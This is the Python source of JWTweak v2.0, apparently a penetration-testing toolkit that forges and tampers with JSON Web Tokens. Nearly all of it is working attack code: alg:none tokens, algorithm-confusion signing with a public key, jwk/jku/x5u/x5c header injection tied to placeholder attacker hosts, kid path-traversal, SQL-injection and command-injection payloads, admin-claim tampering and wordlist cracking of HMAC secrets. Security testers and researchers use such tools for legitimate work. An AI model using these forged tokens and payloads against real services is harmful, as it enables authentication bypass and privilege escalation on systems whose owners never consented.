#!/usr/bin/env python3
# JWTweak v2.0 - JWT security testing toolkit
# Author: Rishu Ranjan (https://github.com/rishuranjanofficial/JWTweak)
#
# Detects the algorithm of an input JWT and generates forged / tampered
# tokens for a wide range of modern JWT attack classes, to help security
# testers find flaws in JWT implementations (algorithm confusion, key-
# resolution header injection, claim tampering, weak-secret cracking, etc).
#
# For authorised security testing and research only.

import argparse
import base64
import datetime
import hashlib
import hmac
import json
import os
import sys

import jwt  # PyJWT

# cryptography is optional for the simple attacks (none, kid, tamper, crack,
# HMAC re-sign) but required for asymmetric key / certificate generation.
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, ed25519, rsa
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    _CRYPTO = True
except Exception:                                       # pragma: no cover
    _CRYPTO = False

__version__ = "2.0"


# --------------------------------------------------------------------------- #
#  Colour handling (auto-disables when piped / unsupported / --no-color)
# --------------------------------------------------------------------------- #
class C:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    WARN = "\033[93m"
    FAIL = "\033[91m"
    GREY = "\033[90m"
    END = "\033[0m"
    BOLD = "\033[1m"
    UL = "\033[4m"

    @classmethod
    def disable(cls):
        for name in ("HEADER", "BLUE", "GREEN", "WARN", "FAIL", "GREY",
                     "END", "BOLD", "UL"):
            setattr(cls, name, "")


def _init_colors(force_off=False):
    if force_off or not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        C.disable()
        return
    if sys.platform == "win32":                         # enable VT on Windows
        try:
            import ctypes
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            C.disable()


def info(msg):   print(f"{C.BLUE}[*]{C.END} {msg}")
def good(msg):   print(f"{C.GREEN}[+]{C.END} {msg}")
def warn(msg):   print(f"{C.WARN}[!]{C.END} {msg}")
def err(msg):    print(f"{C.FAIL}[-]{C.END} {msg}")
def token_out(label, tok):
    print(f"\n{C.BOLD}{label}{C.END}\n{C.GREEN}{tok}{C.END}\n")


# --------------------------------------------------------------------------- #
#  base64url helpers (JWT uses base64url WITHOUT padding)
# --------------------------------------------------------------------------- #
def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    if isinstance(data, str):
        data = data.encode()
    pad = -len(data) % 4
    return base64.urlsafe_b64decode(data + b"=" * pad)


def _json_b64(obj):
    return b64url_encode(json.dumps(obj, separators=(",", ":")))


# --------------------------------------------------------------------------- #
#  JWT parsing
# --------------------------------------------------------------------------- #
class JWTError(Exception):
    pass


def parse_jwt(token):
    """Return (header_dict, payload_dict, raw_signature_b64). Tolerant parser."""
    token = token.strip()
    parts = token.split(".")
    if len(parts) not in (2, 3):
        raise JWTError("Token does not have 2 or 3 dot-separated parts.")
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        raise JWTError(f"Could not decode header: {e}")
    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        # payload may be non-JSON (e.g. nested JWT); keep as raw string
        try:
            payload = b64url_decode(parts[1]).decode("utf-8", "replace")
        except Exception as e:
            raise JWTError(f"Could not decode payload: {e}")
    signature = parts[2] if len(parts) == 3 else ""
    return header, payload, signature


def looks_like_jwt(token):
    parts = token.strip().split(".")
    return len(parts) in (2, 3) and parts[0].startswith("ey")


# --------------------------------------------------------------------------- #
#  Low-level signing
# --------------------------------------------------------------------------- #
_HASHES = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}


def hmac_sign(header, payload, key):
    """Manually HMAC-sign. `key` may be bytes or str (empty allowed)."""
    if isinstance(key, str):
        key = key.encode()
    alg = header.get("alg", "HS256")
    h = _HASHES.get(alg[-3:], hashlib.sha256)
    signing_input = f"{_json_b64(header)}.{_json_b64(payload)}".encode()
    sig = hmac.new(key, signing_input, h).digest()
    return f"{_json_b64(header)}.{_json_b64(payload)}.{b64url_encode(sig)}"


def unsigned_token(header, payload):
    return f"{_json_b64(header)}.{_json_b64(payload)}."


# --------------------------------------------------------------------------- #
#  Key / certificate generation
# --------------------------------------------------------------------------- #
def _need_crypto():
    if not _CRYPTO:
        raise JWTError("This attack needs the 'cryptography' package: "
                       "pip install cryptography")


def gen_rsa(bits=2048):
    _need_crypto()
    key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    priv = key.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    pub = key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo)
    return key, priv, pub


def gen_ec(curve="P-256"):
    _need_crypto()
    curves = {"P-256": ec.SECP256R1(), "P-384": ec.SECP384R1(),
              "P-521": ec.SECP521R1()}
    key = ec.generate_private_key(curves.get(curve, ec.SECP256R1()))
    priv = key.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    pub = key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo)
    return key, priv, pub


def gen_ed25519():
    _need_crypto()
    key = ed25519.Ed25519PrivateKey.generate()
    priv = key.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    pub = key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo)
    return key, priv, pub


def rsa_public_jwk(pub_pem, kid="jwtweak"):
    """Build a public RSA JWK dict from a PEM public key (via PyJWT)."""
    jwk = json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(
        serialization.load_pem_public_key(pub_pem)))
    jwk["kid"] = kid
    jwk.setdefault("use", "sig")
    jwk.setdefault("alg", "RS256")
    return jwk


def self_signed_cert(key, cn="jwtweak"):
    _need_crypto()
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    cert = (x509.CertificateBuilder()
            .subject_name(subject).issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() +
                             datetime.timedelta(days=365))
            .sign(key, hashes.SHA256()))
    return cert


# --------------------------------------------------------------------------- #
#  Attacks  (each returns a list of (label, token) tuples + prints context)
# --------------------------------------------------------------------------- #
def attack_decode(header, payload, signature):
    info("Decoded JWT")
    print(f"\n{C.BOLD}Header{C.END}")
    print(json.dumps(header, indent=2))
    print(f"\n{C.BOLD}Payload{C.END}")
    print(json.dumps(payload, indent=2) if isinstance(payload, dict) else payload)
    print(f"\n{C.BOLD}Signature (b64url){C.END}\n{signature or '(none)'}")
    analyze(header, payload, signature)
    return []


def analyze(header, payload, signature):
    findings = []
    alg = str(header.get("alg", "")).lower()
    if alg == "none" or alg == "":
        findings.append(("HIGH", "alg is 'none' / empty - signature not verified."))
    if alg.startswith("hs"):
        findings.append(("INFO", "HMAC alg - crackable offline if the secret is weak."))
    for h in ("jku", "x5u"):
        if h in header:
            findings.append(("HIGH", f"'{h}' header present - SSRF / key-injection surface."))
    if "jwk" in header:
        findings.append(("HIGH", "'jwk' header present - embedded-key injection surface (CVE-2018-0114)."))
    if "kid" in header:
        findings.append(("MED", "'kid' header present - test path traversal / SQLi / command injection."))
    if isinstance(payload, dict):
        now = datetime.datetime.now(datetime.timezone.utc).timestamp()
        if "exp" not in payload:
            findings.append(("MED", "No 'exp' claim - token may never expire."))
        elif isinstance(payload["exp"], (int, float)) and payload["exp"] < now:
            findings.append(("INFO", "Token is expired - test whether server still accepts it."))
        if "alg" in payload:
            findings.append(("INFO", "Unusual: 'alg' inside payload."))

    print(f"\n{C.BOLD}Risk analysis{C.END}")
    if not findings:
        good("No obvious red flags in header/claims.")
    sev_color = {"HIGH": C.FAIL, "MED": C.WARN, "INFO": C.BLUE}
    for sev, msg in findings:
        print(f"  {sev_color.get(sev, '')}{sev:<4}{C.END}  {msg}")


def attack_none(header, payload):
    """alg:none in several casings, signature stripped."""
    out = []
    for variant in ("none", "None", "NONE", "nOnE"):
        h = dict(header); h["alg"] = variant
        out.append((f"alg={variant}", unsigned_token(h, payload)))
    return out


def attack_confusion(header, payload, public_key_pem):
    """Algorithm confusion: sign with the RSA/EC PUBLIC key as an HMAC secret.

    Done with manual HMAC because PyJWT 2.x blocks public keys as HMAC secrets
    (CVE-2022-29217). The target must be using a verify routine that picks the
    HMAC code path based on the attacker-controlled `alg` header.
    """
    out = []
    for alg in ("HS256", "HS384", "HS512"):
        h = dict(header); h["alg"] = alg
        out.append((f"RS->{alg} confusion (public key as HMAC secret)",
                    hmac_sign(h, payload, public_key_pem)))
    return out


def attack_jwk_injection(header, payload):
    """CVE-2018-0114: embed an attacker public key in the 'jwk' header."""
    _need_crypto()
    key, priv, pub = gen_rsa()
    jwk = rsa_public_jwk(pub, kid="jwtweak-jwk")
    payload_dict = payload if isinstance(payload, dict) else {}
    tok = jwt.encode(payload_dict, priv, algorithm="RS256",
                     headers={"jwk": jwk, "kid": jwk["kid"]})
    info("Embedded a freshly generated public key in the 'jwk' header.")
    return [("jwk header injection (CVE-2018-0114)", tok)]


def attack_jku_injection(header, payload, jku_url):
    """Point 'jku' at an attacker-hosted JWKS. Also emits the JWKS to host."""
    _need_crypto()
    key, priv, pub = gen_rsa()
    jwk = rsa_public_jwk(pub, kid="jwtweak-jku")
    jwks = {"keys": [jwk]}
    payload_dict = payload if isinstance(payload, dict) else {}
    tok = jwt.encode(payload_dict, priv, algorithm="RS256",
                     headers={"jku": jku_url, "kid": jwk["kid"]})
    warn(f"Host this JWKS at: {jku_url}")
    print(f"{C.GREY}{json.dumps(jwks, indent=2)}{C.END}")
    return [("jku header injection (attacker-hosted JWKS)", tok)]


def attack_x5_injection(header, payload, x5u_url=None):
    """x5c (embedded self-signed cert chain) and optional x5u (cert URL)."""
    _need_crypto()
    key, priv, pub = gen_rsa()
    cert = self_signed_cert(key)
    der = cert.public_bytes(serialization.Encoding.DER)
    x5c = base64.b64encode(der).decode()
    payload_dict = payload if isinstance(payload, dict) else {}
    out = []
    tok = jwt.encode(payload_dict, priv, algorithm="RS256",
                     headers={"x5c": [x5c]})
    out.append(("x5c header injection (self-signed cert chain)", tok))
    if x5u_url:
        tok2 = jwt.encode(payload_dict, priv, algorithm="RS256",
                          headers={"x5u": x5u_url})
        pem = cert.public_bytes(serialization.Encoding.PEM).decode()
        warn(f"Host this certificate (PEM) at: {x5u_url}")
        print(f"{C.GREY}{pem}{C.END}")
        out.append(("x5u header injection (attacker-hosted cert)", tok2))
    return out


def attack_kid_injection(header, payload, injected_key=None):
    """kid path traversal / SQLi / command injection payloads.

    - traversal to /dev/null => server reads empty file => HMAC key = b""
    - SQLi / injection => server resolves an attacker-controlled key value
    """
    out = []
    # 1) path traversal to an empty/predictable file -> empty HMAC key
    h = dict(header); h["alg"] = "HS256"
    h["kid"] = "../../../../../../../../dev/null"
    out.append(("kid path traversal -> /dev/null (empty HMAC key)",
                hmac_sign(h, payload, b"")))
    # 2) SQLi that returns an attacker-controlled key
    key = injected_key if injected_key is not None else "jwtweak"
    h2 = dict(header); h2["alg"] = "HS256"
    h2["kid"] = "nonexistent' UNION SELECT '%s'-- -" % key
    out.append((f"kid SQLi -> key '{key}'", hmac_sign(h2, payload, key)))
    # 3) command-injection style kid (signed with chosen/empty key)
    h3 = dict(header); h3["alg"] = "HS256"
    h3["kid"] = "key.pem; sleep 0"
    out.append(("kid command-injection probe", hmac_sign(h3, payload, key)))
    info("Other kid payloads worth testing manually: null-byte, LDAP, absolute paths.")
    return out


def attack_signature(token, header, payload):
    """Signature stripping / corruption variants."""
    parts = token.split(".")
    out = []
    out.append(("signature stripped (empty)", f"{parts[0]}.{parts[1]}."))
    if len(parts) == 3 and parts[2]:
        flipped = ("A" if parts[2][-1] != "A" else "B")
        out.append(("last signature char flipped",
                    f"{parts[0]}.{parts[1]}.{parts[2][:-1]}{flipped}"))
    return out


def attack_resign(header, payload, alg, secret=None, key_pem=None):
    """Re-sign with an arbitrary algorithm. Generates a key if none supplied."""
    payload_dict = payload if isinstance(payload, dict) else {}
    h = {k: v for k, v in header.items() if k not in ("jwk", "jku", "x5u", "x5c")}
    h["alg"] = alg
    extra = {k: header[k] for k in ("kid", "typ") if k in header}

    if alg.startswith("HS"):
        if secret is None:
            secret = "secret"
        return [(f"re-signed {alg} (secret='{secret}')",
                 hmac_sign({**h}, payload_dict, secret))]

    if alg == "none":
        return [("re-signed alg=none", unsigned_token(h, payload_dict))]

    _need_crypto()
    generated = None
    if key_pem:
        signing_key = key_pem
    else:
        if alg.startswith(("RS", "PS")):
            _, signing_key, pub = gen_rsa()
        elif alg.startswith("ES"):
            _, signing_key, pub = gen_ec({"ES256": "P-256", "ES384": "P-384",
                                          "ES512": "P-521"}.get(alg, "P-256"))
        elif alg == "EdDSA":
            _, signing_key, pub = gen_ed25519()
        else:
            raise JWTError(f"Unsupported algorithm: {alg}")
        generated = (signing_key, pub)
    tok = jwt.encode(payload_dict, signing_key, algorithm=alg, headers=extra)
    if generated:
        info("Generated a new key pair for signing (public key below).")
        print(f"{C.GREY}{generated[1].decode()}{C.END}")
    return [(f"re-signed {alg}", tok)]


def attack_crack(token, wordlist_path):
    """Offline HMAC secret brute-force against HS256/384/512 tokens."""
    header, _, _ = parse_jwt(token)
    alg = header.get("alg", "HS256")
    if not alg.upper().startswith("HS"):
        raise JWTError(f"Token uses {alg}, not HMAC - cracking does not apply.")
    if not os.path.isfile(wordlist_path):
        raise JWTError(f"Wordlist not found: {wordlist_path}")
    info(f"Cracking {alg} secret with {wordlist_path} ...")
    tried = 0
    with open(wordlist_path, "rb") as fh:
        for raw in fh:
            secret = raw.rstrip(b"\r\n")
            tried += 1
            try:
                jwt.decode(token, secret, algorithms=[alg],
                           options={"verify_exp": False, "verify_aud": False})
                good(f"SECRET FOUND after {tried} tries: {secret.decode(errors='replace')}")
                return secret.decode(errors="replace")
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue
    err(f"Secret not found ({tried} candidates tried).")
    return None


def attack_suite(token, header, payload, public_key_pem=None,
                 jku_url="https://ATTACKER.example/jwks.json",
                 x5u_url="https://ATTACKER.example/cert.pem"):
    """Run the full battery and collect every candidate token."""
    results = []
    results += attack_none(header, payload)
    results += attack_signature(token, header, payload)
    results += attack_kid_injection(header, payload)
    for alg in ("HS256", "HS384", "HS512"):
        results += attack_resign(header, payload, alg, secret="secret")
    if public_key_pem:
        results += attack_confusion(header, payload, public_key_pem)
    if _CRYPTO:
        try:
            results += attack_jwk_injection(header, payload)
            results += attack_jku_injection(header, payload, jku_url)
            results += attack_x5_injection(header, payload, x5u_url)
            for alg in ("ES256", "EdDSA"):
                results += attack_resign(header, payload, alg)
        except JWTError as e:
            warn(str(e))
    return results


# --------------------------------------------------------------------------- #
#  Output helpers
# --------------------------------------------------------------------------- #
def emit(results, outfile=None):
    if not results:
        return
    for label, tok in results:
        token_out(label, tok)
    if outfile:
        with open(outfile, "w") as fh:
            for label, tok in results:
                fh.write(f"# {label}\n{tok}\n\n")
        good(f"Wrote {len(results)} token(s) to {outfile}")


def read_token(arg_token):
    if arg_token:
        if os.path.isfile(arg_token):
            return open(arg_token).read().strip()
        return arg_token.strip()
    return input("Enter the JWT token: ").strip()


def read_pem(path_or_none, prompt):
    if path_or_none and os.path.isfile(path_or_none):
        return open(path_or_none, "rb").read()
    if path_or_none:                       # treat as inline PEM
        return path_or_none.encode()
    p = input(prompt).strip()
    if not p:
        return None
    if os.path.isfile(p):
        return open(p, "rb").read()
    return p.encode()


# --------------------------------------------------------------------------- #
#  Interactive menu
# --------------------------------------------------------------------------- #
BANNER = r"""
     _ _    _ _____                    _
    | | |  | |_   _|                  | |
    | | |  | | | |_      _____  __ _| | __
_   | | |/\| | | \ \ /\ / / _ \/ _` | |/ /
| |__| \  /\  /  | |\ V  V /  __/ (_| |   <
 \____/ \/  \/   \_/ \_/\_/ \___|\__,_|_|\_\
"""


MENU = """{b}  RECON{e}
   1) Decode & inspect token  (+ risk analysis)

{b}  SIGNATURE / ALGORITHM ATTACKS{e}
   2) alg:none variants        (none / None / NONE / nOnE)
   3) Algorithm confusion      (RSA/EC public key -> HMAC secret)
   4) Re-sign with chosen alg  (HS/RS/PS/ES/EdDSA + key)
   5) Signature strip / tamper

{b}  KEY-RESOLUTION HEADER INJECTION{e}
   6) jwk header injection     (embed attacker key - CVE-2018-0114)
   7) jku header injection     (attacker-hosted JWKS)
   8) x5u / x5c injection      (attacker certificate)
   9) kid injection            (path traversal / SQLi / cmd injection)

{b}  CLAIMS{e}
  10) Claim tampering          (exp / nbf / sub / role / iss / aud ...)

{b}  CRACKING{e}
  11) HMAC secret brute-force  (wordlist)

{b}  AUTOMATION{e}
  12) Run FULL attack suite -> save all candidate tokens
  13) Load a different token
   0) Quit
""".format(b=C.BOLD, e=C.END)


def interactive_claim_tamper(header, payload):
    if not isinstance(payload, dict):
        err("Payload is not JSON - cannot tamper claims structurally.")
        return []
    p = dict(payload)
    print(f"\n{C.BOLD}Current payload{C.END}\n{json.dumps(p, indent=2)}")
    print("""
   a) Remove 'exp'            b) Set 'exp' = now + 10 years
   c) Set role/admin = true   d) Edit a claim manually
   e) Raw JSON replace        (back: ENTER)""")
    ch = input("claim action: ").strip().lower()
    far = int((datetime.datetime.now(datetime.timezone.utc) +
               datetime.timedelta(days=3650)).timestamp())
    if ch == "a":
        p.pop("exp", None)
    elif ch == "b":
        p["exp"] = far
    elif ch == "c":
        p["role"] = "admin"; p["admin"] = True; p["isAdmin"] = True
    elif ch == "d":
        k = input("claim key: ").strip()
        v = input("new value (JSON, e.g. \"admin\" or 1 or true): ").strip()
        try:
            p[k] = json.loads(v)
        except Exception:
            p[k] = v
    elif ch == "e":
        raw = input("paste full JSON payload: ").strip()
        try:
            p = json.loads(raw)
        except Exception as e:
            err(f"Invalid JSON: {e}"); return []
    else:
        return []
    info("Tampered payload (unsigned). Re-sign via option 3/4 if needed.")
    return [("claim-tampered (alg unchanged, unsigned)", unsigned_token(header, p))]


def run_interactive(token, args):
    print(f"{C.HEADER}{BANNER}{C.END}{C.GREY}            v{__version__}{C.END}\n")
    if not looks_like_jwt(token):
        warn("Input does not look like a JWT, continuing anyway.")
    try:
        header, payload, signature = parse_jwt(token)
    except JWTError as e:
        err(str(e)); return
    good("Token parsed.")
    while True:
        print(MENU)
        choice = input(f"{C.BOLD}choice> {C.END}").strip()
        try:
            if choice == "1":
                attack_decode(header, payload, signature)
            elif choice == "2":
                emit(attack_none(header, payload))
            elif choice == "3":
                pem = read_pem(args.public_key,
                               "Path/PEM of the target PUBLIC key: ")
                if pem:
                    emit(attack_confusion(header, payload, pem))
                else:
                    err("A public key is required for this attack.")
            elif choice == "4":
                alg = input("algorithm (HS256/RS256/PS256/ES256/EdDSA/none): ").strip() or "HS256"
                secret = None; key_pem = None
                if alg.startswith("HS"):
                    secret = input("secret (ENTER='secret'): ").strip() or "secret"
                elif alg not in ("none",):
                    key_pem = read_pem(None, "private key path/PEM (ENTER=generate): ")
                emit(attack_resign(header, payload, alg, secret, key_pem))
            elif choice == "5":
                emit(attack_signature(token, header, payload))
            elif choice == "6":
                emit(attack_jwk_injection(header, payload))
            elif choice == "7":
                url = input("jku URL you control (ENTER=placeholder): ").strip() \
                      or "https://ATTACKER.example/jwks.json"
                emit(attack_jku_injection(header, payload, url))
            elif choice == "8":
                url = input("x5u URL you control (ENTER=skip x5u): ").strip() or None
                emit(attack_x5_injection(header, payload, url))
            elif choice == "9":
                k = input("attacker-controlled key for SQLi case (ENTER='jwtweak'): ").strip() or None
                emit(attack_kid_injection(header, payload, k))
            elif choice == "10":
                emit(interactive_claim_tamper(header, payload))
            elif choice == "11":
                wl = input("wordlist path: ").strip()
                attack_crack(token, wl)
            elif choice == "12":
                pem = read_pem(args.public_key,
                               "target PUBLIC key for confusion (ENTER=skip): ")
                out = input("output file (ENTER='jwtweak_tokens.txt'): ").strip() \
                      or "jwtweak_tokens.txt"
                emit(attack_suite(token, header, payload, pem), out)
            elif choice == "13":
                token = read_token(None)
                header, payload, signature = parse_jwt(token)
                good("New token loaded.")
            elif choice == "0":
                break
            else:
                warn("Unknown choice.")
        except JWTError as e:
            err(str(e))
        except KeyboardInterrupt:
            print(); break
        except Exception as e:
            err(f"Unexpected error: {e}")


# --------------------------------------------------------------------------- #
#  Non-interactive CLI
# --------------------------------------------------------------------------- #
def run_cli(args):
    token = read_token(args.token)
    header, payload, signature = parse_jwt(token)
    a = args.attack

    if args.decode or a == "decode":
        attack_decode(header, payload, signature); return
    if a == "none":
        emit(attack_none(header, payload), args.output)
    elif a == "confusion":
        pem = read_pem(args.public_key, "target PUBLIC key path/PEM: ")
        emit(attack_confusion(header, payload, pem), args.output)
    elif a == "jwk":
        emit(attack_jwk_injection(header, payload), args.output)
    elif a == "jku":
        emit(attack_jku_injection(header, payload,
             args.jku or "https://ATTACKER.example/jwks.json"), args.output)
    elif a == "x5":
        emit(attack_x5_injection(header, payload, args.x5u), args.output)
    elif a == "kid":
        emit(attack_kid_injection(header, payload, args.injected_key), args.output)
    elif a == "tamper":
        if args.set_claim:
            p = dict(payload) if isinstance(payload, dict) else {}
            for kv in args.set_claim:
                k, _, v = kv.partition("=")
                try:
                    p[k] = json.loads(v)
                except Exception:
                    p[k] = v
            emit([("claim-tampered (unsigned)", unsigned_token(header, p))], args.output)
        else:
            err("Use --set-claim key=value (repeatable) with --attack tamper.")
    elif a == "resign":
        emit(attack_resign(header, payload, args.alg or "HS256",
                           args.secret, read_pem(args.key, "") if args.key else None),
             args.output)
    elif a == "crack":
        if not args.wordlist:
            err("--wordlist required for crack."); return
        attack_crack(token, args.wordlist)
    elif a == "suite":
        pem = read_pem(args.public_key, "") if args.public_key else None
        emit(attack_suite(token, header, payload, pem,
                          args.jku or "https://ATTACKER.example/jwks.json",
                          args.x5u or "https://ATTACKER.example/cert.pem"),
             args.output or "jwtweak_tokens.txt")
    else:
        err(f"Unknown attack: {a}")


def build_parser():
    p = argparse.ArgumentParser(
        prog="JWTweak",
        description="JWTweak v%s - JWT security testing toolkit." % __version__,
        epilog="Run with no --attack/-t for the interactive menu. "
               "For authorised testing only.")
    p.add_argument("-t", "--token", help="JWT string or path to a file containing it")
    p.add_argument("--attack", choices=["decode", "none", "confusion", "jwk",
                   "jku", "x5", "kid", "tamper", "resign", "crack", "suite"],
                   help="run a single attack non-interactively")
    p.add_argument("--decode", action="store_true", help="decode & analyse, then exit")
    p.add_argument("-o", "--output", help="write generated tokens to this file")
    p.add_argument("--public-key", help="target public key (confusion/suite)")
    p.add_argument("--key", help="private key for re-signing")
    p.add_argument("--secret", help="HMAC secret for re-signing")
    p.add_argument("--alg", help="algorithm for --attack resign")
    p.add_argument("--jku", help="attacker JWKS URL for jku injection")
    p.add_argument("--x5u", help="attacker cert URL for x5u injection")
    p.add_argument("--injected-key", help="attacker key value for kid SQLi case")
    p.add_argument("--set-claim", action="append",
                   help="claim to set for --attack tamper, e.g. role=admin (repeatable)")
    p.add_argument("--wordlist", help="wordlist for --attack crack")
    p.add_argument("--no-color", action="store_true", help="disable coloured output")
    p.add_argument("-V", "--version", action="version",
                   version="JWTweak %s" % __version__)
    return p


def main():
    args = build_parser().parse_args()
    _init_colors(force_off=args.no_color)
    try:
        if args.attack or args.decode:
            run_cli(args)
        else:
            run_interactive(read_token(args.token), args)
    except JWTError as e:
        err(str(e)); sys.exit(2)
    except KeyboardInterrupt:
        print(); sys.exit(130)


if __name__ == "__main__":
    main()
